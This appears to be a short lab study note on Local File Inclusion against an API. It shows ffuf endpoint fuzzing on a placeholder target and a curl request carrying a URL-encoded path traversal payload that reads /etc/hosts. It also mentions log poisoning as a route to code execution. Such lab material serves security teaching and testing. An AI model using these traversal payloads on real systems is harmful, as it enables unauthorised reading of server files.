# Local File Inclusion (LFI)
Refer to [[CBBH Modules (For Testing)/4. File & SSRF Testing/3. File Inclusions/1. File Disclosure/LFI - Local File Inclusion]] for in-depth attacks.

An attack that affects web applications and APIs alike. It allows an attacker to read internal files and sometimes execute code on the server via a series of ways, one being `Apache Log Poisoning`.
## Example Scenario
Suppose we are assessing such an API residing in `http://<TARGET IP>:3000/api`.

Let us perform API endpoint fuzzing using _ffuf_ and the [common-api-endpoints-mazen160.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt) list, as follows.
```shell
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```

It looks like `/api/download` is a valid API endpoint. We can interact with it to look for anything good:
```shell
curl http://<TARGET IP>:3000/api/download
```

We need to specify a file, but we do not have any knowledge of stored files or their naming scheme. We can try mounting a Local File Inclusion (LFI) attack, though.
```shell
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```
